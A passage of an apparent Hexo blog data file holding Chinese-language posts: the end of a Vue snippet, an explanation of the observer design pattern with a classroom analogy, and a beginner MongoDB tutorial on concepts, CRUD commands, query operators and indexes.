class=\"subst\">$&#123;info.date&#125;</span>`</span></span><br><span class=\"line\">        <span class=\"keyword\">const</span> preview = info.infor</span><br><span class=\"line\">        MessageBox(&#123;</span><br><span class=\"line\">          title: titleDate,</span><br><span class=\"line\">          message: preview,</span><br><span class=\"line\">          showCancelButton: <span class=\"literal\">false</span>,</span><br><span class=\"line\">          closeOnClickModal: <span class=\"literal\">true</span></span><br><span class=\"line\">        &#125;)</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>其他：为了减少篇幅，省略样式</p>\n<p><a href=\"https://github.com/houfee\" target=\"_blank\" rel=\"noopener\">github地址</a></p>\n"},{"title":"观察者模式","abbrlink":"9a246216","_content":"\n\n# Observer(观察者)模式\n参考：\n\n《JavaScript设计模式》 P42\n\n[人人都会设计模式：观察者模式--Observer](https://segmentfault.com/a/1190000012295887)\n\n[原生JavaScript实现观察者模式](https://blog.csdn.net/lm278858445/article/details/78287492)\n\n[JS 观察者模式](https://segmentfault.com/a/1190000012547812)\n\n[观察者模式](https://segmentfault.com/a/1190000018260980)\n## 什么观察者模式\n第一次听到这个概念是在我刚学习vue的时候，现在已经过去快一年，vue已经基本熟悉了，现在回过头来学习一下这个传说中的观察者模式。\n\n**首先看一下概念：**\n\n![观察者模式](观察者模式\\观察者模式.png)\n\n一个对象（称为subject）维持一系列依赖于它的对象（观察者），将有关状态的任何变更自动通知给它们。\n\n当一个目标需要告诉观察者发生什么有趣的事情，它会向观察者广播一个通知（可以包括与通知主题相关的特定数据）\n\n当我们不再希望某个特定的观察者获得其注册目标发出的改变通知时，改目标可以将它从观察者列表中删除。\n\n怎么理解呢？\n我这里做一个比喻：\n\n将称为subject的被观察者对象视为老师；将一系列观察者视为学生。\n\n当老师讲课时，学生聚精会神的听课——现在就是老师（被观察者）向学生（观察者）发出一个通知；\n\n老师讲课时，某一个学生迟到，然后中途加入了听讲的学生行列——这时就是新增加一个观察者；\n\n老师讲课时，某一个学生肚子疼，中途去了厕所——这时就可以认为删除了一个观察者。\n\n\n\n好了通俗易懂的理解就到这里，现在看看书上的概念：\n\n*Subject(目标，被观察者)：*\n\n维护一系列观察者，方便添加或删除观察者。\n\n*Observer(观察者)：*\n\n为那些在目标（被观察者）发生改变时需获得通知的对象提供一个更新的接口。\n\n*ConcreateSubject(具体目标)：*\n\n状态发生改变时，向 *Observer* 发出通知，储存 *ConcreateSubject* 的状态。\n\n*ConcreteObserver(具体观察者)：*\n\n储存一个指向 *ConcreateSubject* 的引用，实现 *Observer* 的更新接口，以使自身状态与目标的状态保持一致。\n\n\n\n那么再说一说常见的观察者模式的例子：\n\n在前端业务中，浏览器的事件也是观察者模式\n```javascript\ndiv.onclick = function click() {\n  alert('这就是一个简单的观察者事件')\n}\n```\n+ div 的 click 事件是被观察者\n+ function click是观察者\n+ function click 订阅 div click 事件，事件发生时，对应的动作就是 alert() \n\n","source":"_posts/观察者模式.md","raw":"---\ntitle: 观察者模式\ncategories:\n  - 设计模式\ntags:\n  - 设计模式\nabbrlink: 9a246216\n---\n\n\n# Observer(观察者)模式\n参考：\n\n《JavaScript设计模式》 P42\n\n[人人都会设计模式：观察者模式--Observer](https://segmentfault.com/a/1190000012295887)\n\n[原生JavaScript实现观察者模式](https://blog.csdn.net/lm278858445/article/details/78287492)\n\n[JS 观察者模式](https://segmentfault.com/a/1190000012547812)\n\n[观察者模式](https://segmentfault.com/a/1190000018260980)\n## 什么观察者模式\n第一次听到这个概念是在我刚学习vue的时候，现在已经过去快一年，vue已经基本熟悉了，现在回过头来学习一下这个传说中的观察者模式。\n\n**首先看一下概念：**\n\n![观察者模式](观察者模式\\观察者模式.png)\n\n一个对象（称为subject）维持一系列依赖于它的对象（观察者），将有关状态的任何变更自动通知给它们。\n\n当一个目标需要告诉观察者发生什么有趣的事情，它会向观察者广播一个通知（可以包括与通知主题相关的特定数据）\n\n当我们不再希望某个特定的观察者获得其注册目标发出的改变通知时，改目标可以将它从观察者列表中删除。\n\n怎么理解呢？\n我这里做一个比喻：\n\n将称为subject的被观察者对象视为老师；将一系列观察者视为学生。\n\n当老师讲课时，学生聚精会神的听课——现在就是老师（被观察者）向学生（观察者）发出一个通知；\n\n老师讲课时，某一个学生迟到，然后中途加入了听讲的学生行列——这时就是新增加一个观察者；\n\n老师讲课时，某一个学生肚子疼，中途去了厕所——这时就可以认为删除了一个观察者。\n\n\n\n好了通俗易懂的理解就到这里，现在看看书上的概念：\n\n*Subject(目标，被观察者)：*\n\n维护一系列观察者，方便添加或删除观察者。\n\n*Observer(观察者)：*\n\n为那些在目标（被观察者）发生改变时需获得通知的对象提供一个更新的接口。\n\n*ConcreateSubject(具体目标)：*\n\n状态发生改变时，向 *Observer* 发出通知，储存 *ConcreateSubject* 的状态。\n\n*ConcreteObserver(具体观察者)：*\n\n储存一个指向 *ConcreateSubject* 的引用，实现 *Observer* 的更新接口，以使自身状态与目标的状态保持一致。\n\n\n\n那么再说一说常见的观察者模式的例子：\n\n在前端业务中，浏览器的事件也是观察者模式\n```javascript\ndiv.onclick = function click() {\n  alert('这就是一个简单的观察者事件')\n}\n```\n+ div 的 click 事件是被观察者\n+ function click是观察者\n+ function click 订阅 div click 事件，事件发生时，对应的动作就是 alert() \n\n","slug":"观察者模式","published":1,"date":"2020-06-18T07:09:21.444Z","updated":"2020-06-22T10:04:03.834Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckclr4u5v0013qrwtlomxach5","content":"<h1 id=\"Observer-观察者-模式\"><a href=\"#Observer-观察者-模式\" class=\"headerlink\" title=\"Observer(观察者)模式\"></a>Observer(观察者)模式</h1><p>参考：</p>\n<p>《JavaScript设计模式》 P42</p>\n<p><a href=\"https://segmentfault.com/a/1190000012295887\" target=\"_blank\" rel=\"noopener\">人人都会设计模式：观察者模式–Observer</a></p>\n<p><a href=\"https://blog.csdn.net/lm278858445/article/details/78287492\" target=\"_blank\" rel=\"noopener\">原生JavaScript实现观察者模式</a></p>\n<p><a href=\"https://segmentfault.com/a/1190000012547812\" target=\"_blank\" rel=\"noopener\">JS 观察者模式</a></p>\n<p><a href=\"https://segmentfault.com/a/1190000018260980\" target=\"_blank\" rel=\"noopener\">观察者模式</a></p>\n<h2 id=\"什么观察者模式\"><a href=\"#什么观察者模式\" class=\"headerlink\" title=\"什么观察者模式\"></a>什么观察者模式</h2><p>第一次听到这个概念是在我刚学习vue的时候，现在已经过去快一年，vue已经基本熟悉了，现在回过头来学习一下这个传说中的观察者模式。</p>\n<p><strong>首先看一下概念：</strong></p>\n<p><img src=\"/view/posts/9a246216/观察者模式.png\" alt=\"观察者模式\"></p>\n<p>一个对象（称为subject）维持一系列依赖于它的对象（观察者），将有关状态的任何变更自动通知给它们。</p>\n<p>当一个目标需要告诉观察者发生什么有趣的事情，它会向观察者广播一个通知（可以包括与通知主题相关的特定数据）</p>\n<p>当我们不再希望某个特定的观察者获得其注册目标发出的改变通知时，改目标可以将它从观察者列表中删除。</p>\n<p>怎么理解呢？<br>我这里做一个比喻：</p>\n<p>将称为subject的被观察者对象视为老师；将一系列观察者视为学生。</p>\n<p>当老师讲课时，学生聚精会神的听课——现在就是老师（被观察者）向学生（观察者）发出一个通知；</p>\n<p>老师讲课时，某一个学生迟到，然后中途加入了听讲的学生行列——这时就是新增加一个观察者；</p>\n<p>老师讲课时，某一个学生肚子疼，中途去了厕所——这时就可以认为删除了一个观察者。</p>\n<p>好了通俗易懂的理解就到这里，现在看看书上的概念：</p>\n<p><em>Subject(目标，被观察者)：</em></p>\n<p>维护一系列观察者，方便添加或删除观察者。</p>\n<p><em>Observer(观察者)：</em></p>\n<p>为那些在目标（被观察者）发生改变时需获得通知的对象提供一个更新的接口。</p>\n<p><em>ConcreateSubject(具体目标)：</em></p>\n<p>状态发生改变时，向 <em>Observer</em> 发出通知，储存 <em>ConcreateSubject</em> 的状态。</p>\n<p><em>ConcreteObserver(具体观察者)：</em></p>\n<p>储存一个指向 <em>ConcreateSubject</em> 的引用，实现 <em>Observer</em> 的更新接口，以使自身状态与目标的状态保持一致。</p>\n<p>那么再说一说常见的观察者模式的例子：</p>\n<p>在前端业务中，浏览器的事件也是观察者模式<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">div.onclick = <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">click</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  alert(<span class=\"string\">'这就是一个简单的观察者事件'</span>)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li>div 的 click 事件是被观察者</li>\n<li>function click是观察者</li>\n<li>function click 订阅 div click 事件，事件发生时，对应的动作就是 alert() </li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Observer-观察者-模式\"><a href=\"#Observer-观察者-模式\" class=\"headerlink\" title=\"Observer(观察者)模式\"></a>Observer(观察者)模式</h1><p>参考：</p>\n<p>《JavaScript设计模式》 P42</p>\n<p><a href=\"https://segmentfault.com/a/1190000012295887\" target=\"_blank\" rel=\"noopener\">人人都会设计模式：观察者模式–Observer</a></p>\n<p><a href=\"https://blog.csdn.net/lm278858445/article/details/78287492\" target=\"_blank\" rel=\"noopener\">原生JavaScript实现观察者模式</a></p>\n<p><a href=\"https://segmentfault.com/a/1190000012547812\" target=\"_blank\" rel=\"noopener\">JS 观察者模式</a></p>\n<p><a href=\"https://segmentfault.com/a/1190000018260980\" target=\"_blank\" rel=\"noopener\">观察者模式</a></p>\n<h2 id=\"什么观察者模式\"><a href=\"#什么观察者模式\" class=\"headerlink\" title=\"什么观察者模式\"></a>什么观察者模式</h2><p>第一次听到这个概念是在我刚学习vue的时候，现在已经过去快一年，vue已经基本熟悉了，现在回过头来学习一下这个传说中的观察者模式。</p>\n<p><strong>首先看一下概念：</strong></p>\n<p><img src=\"/view/posts/9a246216/观察者模式.png\" alt=\"观察者模式\"></p>\n<p>一个对象（称为subject）维持一系列依赖于它的对象（观察者），将有关状态的任何变更自动通知给它们。</p>\n<p>当一个目标需要告诉观察者发生什么有趣的事情，它会向观察者广播一个通知（可以包括与通知主题相关的特定数据）</p>\n<p>当我们不再希望某个特定的观察者获得其注册目标发出的改变通知时，改目标可以将它从观察者列表中删除。</p>\n<p>怎么理解呢？<br>我这里做一个比喻：</p>\n<p>将称为subject的被观察者对象视为老师；将一系列观察者视为学生。</p>\n<p>当老师讲课时，学生聚精会神的听课——现在就是老师（被观察者）向学生（观察者）发出一个通知；</p>\n<p>老师讲课时，某一个学生迟到，然后中途加入了听讲的学生行列——这时就是新增加一个观察者；</p>\n<p>老师讲课时，某一个学生肚子疼，中途去了厕所——这时就可以认为删除了一个观察者。</p>\n<p>好了通俗易懂的理解就到这里，现在看看书上的概念：</p>\n<p><em>Subject(目标，被观察者)：</em></p>\n<p>维护一系列观察者，方便添加或删除观察者。</p>\n<p><em>Observer(观察者)：</em></p>\n<p>为那些在目标（被观察者）发生改变时需获得通知的对象提供一个更新的接口。</p>\n<p><em>ConcreateSubject(具体目标)：</em></p>\n<p>状态发生改变时，向 <em>Observer</em> 发出通知，储存 <em>ConcreateSubject</em> 的状态。</p>\n<p><em>ConcreteObserver(具体观察者)：</em></p>\n<p>储存一个指向 <em>ConcreateSubject</em> 的引用，实现 <em>Observer</em> 的更新接口，以使自身状态与目标的状态保持一致。</p>\n<p>那么再说一说常见的观察者模式的例子：</p>\n<p>在前端业务中，浏览器的事件也是观察者模式<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">div.onclick = <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">click</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  alert(<span class=\"string\">'这就是一个简单的观察者事件'</span>)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li>div 的 click 事件是被观察者</li>\n<li>function click是观察者</li>\n<li>function click 订阅 div click 事件，事件发生时，对应的动作就是 alert() </li>\n</ul>\n"},{"title":"moogoDB入门一","abbrlink":24755,"date":"2020-07-08T10:25:03.000Z","_content":"\n1.[MONGODB入门篇](https://www.cnblogs.com/clsn/p/8214194.html#auto_id_0)\n\n2.[centos安装mongodb 4.x及配置用户名密码（官方推荐的方式）](https://cloud.tencent.com/developer/article/1455000)\n\n3.[MONGODB手册](https://docs.mongodb.com/manual/)\n\n4.[Express 教程 3：使用数据库 (Mongoose)](https://developer.mozilla.org/zh-CN/docs/Learn/Server-side/Express_Nodejs/mongoose)\n\n5.[菜鸟教程](https://www.runoob.com/mongodb/mongodb-tutorial.html)\n\n## 基本概念\n\n### NoSQL\n\nNoSQL(NoSQL = Not Only SQL )，意即\"不仅仅是SQL\"。\n\nNoSQL，指的是非关系型的数据库。NoSQL有时也称作Not Only SQL的缩写，是对不同于传统的关系型数据库的数据库管理系统的统称。\n\nNoSQL用于超大规模数据的存储。（例如个人信息，社交网络，地理位置，用户生成的数据和用户操作日志）。这些类型的数据存储不需要固定的模式，无需多余操作就可以横向扩展。\n\n### 基本术语\n\n| SQL术语/概念 | MongoDB术语/概念 | 解释/说明                           |\n| :----------- | :--------------- | :---------------------------------- |\n| database     | database         | 数据库                              |\n| table        | collection       | 数据库表/集合                       |\n| row          | document         | 数据记录行/文档                     |\n| column       | field            | 数据字段/域                         |\n| index        | index            | 索引                                |\n| table joins  |                  | 表连接,MongoDB不支持                |\n| primary key  | primary key      | 主键,MongoDB自动将_id字段设置为主键 |\n\n### 数据库\n\n一个mongodb中可以建立多个数据库。\n\n数据库命名规范：\n\n- 不能是空字符串（\"\")。\n- 不得含有' '（空格)、.、$、/、\\和\\0 (空字符)。\n- 应全部小写。\n- 最多64字节。\n\n数据库保留字：`admin`、`local`、`config`\n\n### 文档\n\nRDBMS 与 MongoDB 对应的术语：\n\n| RDBMS  | MongoDB                           |\n| :----- | :-------------------------------- |\n| 数据库 | 数据库                            |\n| 表格   | 集合                              |\n| 行     | 文档                              |\n| 列     | 字段                              |\n| 表联合 | 嵌入文档                          |\n| 主键   | 主键 (MongoDB 提供了 key 为 _id ) |\n\n## 数据库基本操作\n\n+ MongoDB连接\n\n```bash\nmongodb://[username:password@]host1[:port1][,host2[:port2],...[,hostN[:portN]]][/[database][?options]]\n\n# mongodb://admin:123456@localhost/test\n```\n\n### CRUD\n\n```bash\n# 展示数据库\nshow dbs\n# 创建或进入数据库（如果该数据库中没有数据，将不会 show dbs 中子展示出来）\nuse mydb\n# 向mydb的mycol集合中插入一条数据\ndb.mycol.insert({\"name\": \"houfei\"})\n# MongoDB 中默认的数据库为 test，如果你没有创建新的数据库，集合将存放在 test 数据库中。\n```\n\n+ [创建/删除集合](https://www.runoob.com/mongodb/mongodb-create-collection.html)\n\n`db.createCollection(name, options)`\n\n```bash\n# 创建或进入数据库（如果该数据库中没有集合时，将不会 show dbs 中子展示出来）\nuse mydb\n# 创建mycol集合\ndb.createCollection(\"mycol\")\n# 在 MongoDB 中，你不需要创建集合。当你插入一些文档时，MongoDB 会自动创建集合。\ndb.mycol.insert({\"name\": \"houfei\"})\n\n# 进入数据库\nuse mydb\n# 查看已存在的集合\nshow collections\n# 删除集合 mycol\ndb.mycol.drop()\n```\n\n+ [文档的CRUD](https://www.runoob.com/mongodb/mongodb-insert.html)\n\n**插入文档**——`db.<collecetion>.insert(document)`\n\n```bash\n# 向test数据库中插入stus集合中插入一个新的学生对象\ndb.stus.insert(\n  {name: \"小明\", gender: \"男\"}\n)\n\n# 向test数据库中插入teather集合中插入2个新的老师对象\ndb.teather.insert([\n  {name: \"马云\", gender: \"男\"},\n  {name: \"马化腾\", gender: \"男\"}\n])\n\n\n\n# db.stus.insertOne() 插入一个\n# db.stus.insertMany() 插入多个\n```\n\n**查询文档**——`db.<collection>.find(query（查询条件）, projection（投影）)`\n\n| 操作       |     格式     | 范例                                        | RDBMS中的类似语句       |\n| :--------- | :----------: | :------------------------------------------ | :---------------------- |\n| 等于       |    `{:`}     | `db.col.find({\"by\":\"菜鸟教程\"}).pretty()`   | `where by = '菜鸟教程'` |\n| 小于       | `{:{$lt:}}`  | `db.col.find({\"likes\":{$lt:50}}).pretty()`  | `where likes < 50`      |\n| 小于或等于 | `{:{$lte:}}` | `db.col.find({\"likes\":{$lte:50}}).pretty()` | `where likes <= 50`     |\n| 大于       | `{:{$gt:}}`  | `db.col.find({\"likes\":{$gt:50}}).pretty()`  | `where likes > 50`      |\n| 大于或等于 | `{:{$gte:}}` | `db.col.find({\"likes\":{$gte:50}}).pretty()` | `where likes >= 50`     |\n| 不等于     | `{:{$ne:}}`  | `db.col.find({\"likes\":{$ne:50}}).pretty()`  | `where likes != 50`     |\n\n```bash\n# 查询 “likes” 大于50，并且“by”为“菜鸟教程”或者“title”为“MongoDB 教程”的数据\ndb.col.find({\n\t\"likes\": {$gt:50},\n\t$or: [{\"by\": \"菜鸟教程\"},{\"title\": \"MongoDB 教程\"}]\n}).pretty()\n```\n\n[*案例*](https://docs.mongodb.com/manual/reference/method/db.collection.find/#query-an-array-of-documents)\n\n```bash\n# 向 bios 集合插入如下文档\n{\n    \"_id\" : <value>,\n    \"name\" : { \"first\" : <string>, \"last\" : <string> },       // embedded document\n    \"birth\" : <ISODate>,\n    \"death\" : <ISODate>,\n    \"contribs\" : [ <string>, ... ],                           // Array of Strings\n    \"awards\" : [\n        { \"award\" : <string>, year: <number>, by: <string> }  // Array of embedded documents\n        ...\n    ]\n}\n\n# 全部查询\n# 查询所有数据\ndb.bios.find()\n\n# 标准查询\n# 查询_id 为5的数据\ndb.bios.find( { _id: 5 } )\n# 查询 name 对象下的 last 属性值为 Hopper 的所有数据\ndb.bios.find( { \"name.last\": \"Hopper\" } )\n\n\n# 使用运算符的查询\n# 使用$in操作符返回id等于5和ObjectId为(“507c35dd8fada716c89d0013”)的文档\ndb.bios.find(\n   { _id: { $in: [ 5, ObjectId(\"507c35dd8fada716c89d0013\") ] } }\n)\n\n# 查询 生日大于 new Date('1950-01-01') 的文档\ndb.bios.find(\n\t{ birth: { $gt: new Date('1950-01-01') } } \n)\n\n# 查询 name 对象下的 last 属性值符合 /^N/表达式 的所有数据\ndb.bios.find(\n   { \"name.last\": { $regex: /^N/ } }\n) \n\n\n# 查询范围\n# 查询 生日大于 new Date('1940-01-01') 小于 new Date('1960-01-01' 的文档\ndb.bios.find( \n\t{ birth: {\n\t\t$gt: new Date('1940-01-01'),\n\t\t$lt: new Date('1960-01-01') \n  } }\n)\n\n# 查询 生日大于 new Date('1920-01-01') 并且 death 为 false 的文档\ndb.bios.find( {\n   birth: { $gt: new Date('1920-01-01') },\n   death: { $exists: false }\n} ) \n\n\n# 查询精确匹配嵌入的文档\n# 查询 name 对象为 { first: \"Yukihiro\", last: \"Matsumoto\" } 的文档（包括顺序，并且不能包含其他属性）\ndb.bios.find(\n    { name: { first: \"Yukihiro\", last: \"Matsumoto\" } }\n)\n\n# 嵌入式文档的查询字段\n# 其中嵌入的文档名称包含第一个值为“Yukihiro”的字段和最后一个值为“Matsumoto”的字段。\ndb.bios.find(\n   {\n     \"name.first\": \"Yukihiro\",\n     \"name.last\": \"Matsumoto\"\n   }\n)\n\n# 查询数组元素\n# 查询数组字段contribs包含元素“UNIX”\ndb.bios.find( { contribs: \"UNIX\" } )\n\n# 数组字段设计包含元素“ALGOL”或“Lisp”\ndb.bios.find( { contribs: { $in: [ \"ALGOL\", \"Lisp\" ]} } )\n\n# 数组字段设计包含元素“ALGOL”和“Lisp”\ndb.bios.find( { contribs: { $all: [ \"ALGOL\", \"Lisp\" ] } } )\n\n# contribs的数组大小为4\ndb.bios.find( { contribs: { $size: 4 } } ) \n```\n\n\n\n[**更新文档**](https://www.runoob.com/mongodb/mongodb-update.html)\n\n```bash\ndb.collection.update(\n   <query>, # update的查询条件，类似sql update查询内where后面的。\n   <update>, # 更新内容\n   {\n     upsert: <boolean>, # 如果不存在update的记录，是否插入objNew,true为插入，默认是false，不插入。\n     multi: <boolean>, # 可选，mongodb 默认是false,是否只更新第一条\n     writeConcern: <document> # 可选，抛出异常的级别。\n   }\n)\n```\n\n```bash\n# db.<collecetion>.update(查询条件, 修改条件)\n# - update 会默认将 新对象 替换 旧对象\n# - 如果是修改指定的属性，而不是替换，需要使用“替换操作符”来完成修改\n#  $set 可以用来修改文档中的指定的属性\n#  $unset 可以用来删除文档中的指定的属性\n\n\ndb.stus.update(\n  {gender: \"女\", name: \"蜘蛛精\" },\n  {gender: \"男\", name: \"孙悟空\", age: 30 }\n)\n\ndb.stus.update({name: \"one\" }, {\n  $set: {\n    gender: \"男\",\n    name: \" 猪八戒\",\n    addr: \"高老庄\"\n  }\n}, {\n  multi: true\n})\n```\n\n\n\n[**删除文档**](https://www.runoob.com/mongodb/mongodb-remove.html)\n\n```bash\ndb.<collecetion>.remove(\n  删除条件,\n  是否删除一个<true为删除一个，默认false>\n)\n# 会删除符合条件的所有数据\n# 如果传递一个空对象，会把所有数据删除\n\ndb.<collecetion>.remove({}) # 性能较差，删除数据，但是不清空集合\n\ndb.<collecetion>.deleteOne(删除条件)\ndb.<collecetion>.deleteMany(删除条件)\n\n\nshow collecetions\ndb.dropDatabase() # 删除 数据库\ndb.<collecetion>.drop() # 清空集合\n```\n\n\n\n### 条件操作符\n\n```bash\n$gt > $gte >=  $lt  < $lte <=  $ne !=  $eq  =\n```\n\n\n\n### $type操作符\n\n 根据字符数据类型查询\n\n```bash\ndb.col.insert([\n\t{title: 'PHP 教程'},\n\t{title: 'Java 教程'},\n\t{title: 'MongoDB 教程'}\n])\n\n# 查询 title 为 string 的文档\ndb.col.find({\"title\" : {$type : 2}})\n或\ndb.col.find({\"title\" : {$type : 'string'}})\n```\n\n### Limit与Skip方法\n\n```bash\ndb.COLLECTION_NAME.find().limit(NUMBER) # 限制查询多少条\ndb.COLLECTION_NAME.find().skip(NUMBER) # 跳过多少条\n```\n\n### sort() 方法\n\n```bash\ndb.col.find({}).sort({\"likes\":-1}) # 数据按字段 likes 的降序排列 1为升序 -1为降序\n```\n\n### createIndex() 方法\n\n索引存储在一个易于遍历读取的数据集合中，索引是对数据库表中一列或多列的值进行排序的一种结构。\n\n```bash\ndb.col.createIndex({\"title\":1})\n\n# 1、查看集合索引\ndb.col.getIndexes()\n# 2、查看集合索引大小\ndb.col.totalIndexSize()\n# 3、删除集合所有索引\ndb.col.dropIndexes()\n# 4、删除集合指定索引\ndb.col.dropIndex(\"索引名称\")\n```\n","source":"_posts/moogoDB入门一.md","raw":"---\ntitle: moogoDB入门一\nabbrlink: 24755\ndate: 2020-07-08 18:25:03\ncategories:\n  - 数据库\ntags:\n  - MongoDB\n---\n\n1.[MONGODB入门篇](https://www.cnblogs.com/clsn/p/8214194.html#auto_id_0)\n\n2.[centos安装mongodb 4.x及配置用户名密码（官方推荐的方式）](https://cloud.tencent.com/developer/article/1455000)\n\n3.[MONGODB手册](https://docs.mongodb.com/manual/)\n\n4.[Express 教程 3：使用数据库 (Mongoose)](https://developer.mozilla.org/zh-CN/docs/Learn/Server-side/Express_Nodejs/mongoose)\n\n5.[菜鸟教程](https://www.runoob.com/mongodb/mongodb-tutorial.html)\n\n## 基本概念\n\n### NoSQL\n\nNoSQL(NoSQL = Not Only SQL )，意即\"不仅仅是SQL\"。\n\nNoSQL，指的是非关系型的数据库。NoSQL有时也称作Not Only SQL的缩写，是对不同于传统的关系型数据库的数据库管理系统的统称。\n\nNoSQL用于超大规模数据的存储。（例如个人信息，社交网络，地理位置，用户生成的数据和用户操作日志）。这些类型的数据存储不需要固定的模式，无需多余操作就可以横向扩展。\n\n### 基本术语\n\n| SQL术语/概念 | MongoDB术语/概念 | 解释/说明                           |\n| :----------- | :--------------- | :---------------------------------- |\n| database     | database         | 数据库                              |\n| table        | collection       | 数据库表/集合                       |\n| row          | document         | 数据记录行/文档                     |\n| column       | field            | 数据字段/域                         |\n| index        | index            | 索引                                |\n| table joins  |                  | 表连接,MongoDB不支持                |\n| primary key  | primary key      | 主键,MongoDB自动将_id字段设置为主键 |\n\n### 数据库\n\n一个mongodb中可以建立多个数据库。\n\n数据库命名规范：\n\n- 不能是空字符串（\"\")。\n- 不得含有' '（空格)、.、$、/、\\和\\0 (空字符)。\n- 应全部小写。\n- 最多64字节。\n\n数据库保留字：`admin`、`local`、`config`\n\n### 文档\n\nRDBMS 与 MongoDB 对应的术语：\n\n| RDBMS  | MongoDB                           |\n| :----- | :-------------------------------- |\n| 数据库 | 数据库                            |\n| 表格   | 集合                              |\n| 行     | 文档                              |\n| 列     | 字段                              |\n| 表联合 | 嵌入文档                          |\n| 主键   | 主键 (MongoDB 提供了 key 为 _id ) |\n\n## 数据库基本操作\n\n+ MongoDB连接\n\n```bash\nmongodb://[username:password@]host1[:port1][,host2[:port2],...[,hostN[:portN]]][/[database][?options]]\n\n# mongodb://admin:123456@localhost/test\n```\n\n### CRUD\n\n```bash\n# 展示数据库\nshow dbs\n# 创建或进入数据库（如果该数据库中没有数据，将不会 show dbs 中子展示出来）\nuse mydb\n# 向mydb的mycol集合中插入一条数据\ndb.mycol.insert({\"name\": \"houfei\"})\n# MongoDB 中默认的数据库为 test，如果你没有创建新的数据库，集合将存放在 test 数据库中。\n```\n\n+ [创建/删除集合](https://www.runoob.com/mongodb/mongodb-create-collection.html)\n\n`db.createCollection(name, options)`\n\n```bash\n# 创建或进入数据库（如果该数据库中没有集合时，将不会 show dbs 中子展示出来）\nuse mydb\n# 创建mycol集合\ndb.createCollection(\"mycol\")\n# 在 MongoDB 中，你不需要创建集合。当你插入一些文档时，MongoDB 会自动创建集合。\ndb.mycol.insert({\"name\": \"houfei\"})\n\n# 进入数据库\nuse mydb\n# 查看已存在的集合\nshow collections\n# 删除集合 mycol\ndb.mycol.drop()\n```\n\n+ [文档的CRUD](https://www.runoob.com/mongodb/mongodb-insert.html)\n\n**插入文档**——`db.<collecetion>.insert(document)`\n\n```bash\n# 向test数据库中插入stus集合中插入一个新的学生对象\ndb.stus.insert(\n  {name: \"小明\", gender: \"男\"}\n)\n\n# 向test数据库中插入teather集合中插入2个新的老师对象\ndb.teather.insert([\n  {name: \"马云\", gender: \"男\"},\n  {name: \"马化腾\", gender: \"男\"}\n])\n\n\n\n# db.stus.insertOne() 插入一个\n# db.stus.insertMany() 插入多个\n```\n\n**查询文档**——`db.<collection>.find(query（查询条件）, projection（投影）)`\n\n| 操作       |     格式     | 范例                                        | RDBMS中的类似语句       |\n| :--------- | :----------: | :------------------------------------------ | :---------------------- |\n| 等于       |    `{:`}     | `db.col.find({\"by\":\"菜鸟教程\"}).pretty()`   | `where by = '菜鸟教程'` |\n| 小于       | `{:{$lt:}}`  | `db.col.find({\"likes\":{$lt:50}}).pretty()`  | `where likes < 50`      |\n| 小于或等于 | `{:{$lte:}}` | `db.col.find({\"likes\":{$lte:50}}).pretty()` | `where likes <= 50`     |\n| 大于       | `{:{$gt:}}`  | `db.col.find({\"likes\":{$gt:50}}).pretty()`  | `where likes > 50`      |\n| 大于或等于 | `{:{$gte:}}` | `db.col.find({\"likes\":{$gte:50}}).pretty()` | `where likes >= 50`     |\n| 不等于     | `{:{$ne:}}`  | `db.col.find({\"likes\":{$ne:50}}).pretty()`  | `where likes != 50`     |\n\n```bash\n# 查询 “likes” 大于50，并且“by”为“菜鸟教程”或者“title”为“MongoDB 教程”的数据\ndb.col.find({\n\t\"likes\": {$gt:50},\n\t$or: [{\"by\": \"菜鸟教程\"},{\"title\": \"MongoDB 教程\"}]\n}).pretty()\n```\n\n[*案例*](https://docs.mongodb.com/manual/reference/method/db.collection.find/#query-an-array-of-documents)\n\n```bash\n# 向 bios 集合插入如下文档\n{\n    \"_id\" : <value>,\n    \"name\" : { \"first\" : <string>, \"last\" : <string> },       // embedded document\n    \"birth\" : <ISODate>,\n    \"death\" : <ISODate>,\n    \"contribs\" : [ <string>, ... ],                           // Array of Strings\n    \"awards\" : [\n        { \"award\" : <string>, year: <number>, by: <string> }  // Array of embedded documents\n        ...\n    ]\n}\n\n# 全部查询\n# 查询所有数据\ndb.bios.find()\n\n# 标准查询\n# 查询_id 为5的数据\ndb.bios.find( { _id: 5 } )\n# 查询 name 对象下的 last 属性值为 Hopper 的所有数据\ndb.bios.find( { \"name.last\": \"Hopper\" } )\n\n\n# 使用运算符的查询\n# 使用$in操作符返回id等于5和ObjectId为(“507c35dd8fada716c89d0013”)的文档\ndb.bios.find(\n   { _id: { $in: [ 5, ObjectId(\"507c35dd8fada716c89d0013\") ] } }\n)\n\n# 查询 生日大于 new Date('1950-01-01') 的文档\ndb.bios.find(\n\t{ birth: { $gt: new Date('1950-01-01') } } \n)\n\n# 查询 name 对象下的 last 属性值符合 /^N/表达式 的所有数据\ndb.bios.find(\n   { \"name.last\": { $regex: /^N/ } }\n) \n\n\n# 查询范围\n# 查询 生日大于 new Date('1940-01-01') 小于 new Date('1960-01-01' 的文档\ndb.bios.find( \n\t{ birth: {\n\t\t$gt: new Date('1940-01-01'),\n\t\t$lt: new Date('1960-01-01') \n  } }\n)\n\n# 查询 生日大于 new Date('1920-01-01') 并且 death 为 false 的文档\ndb.bios.find( {\n   birth: { $gt: new Date('1920-01-01') },\n   death: { $exists: false }\n} ) \n\n\n# 查询精确匹配嵌入的文档\n# 查询 name 对象为 { first: \"Yukihiro\", last: \"Matsumoto\" } 的文档（包括顺序，并且不能包含其他属性）\ndb.bios.find(\n  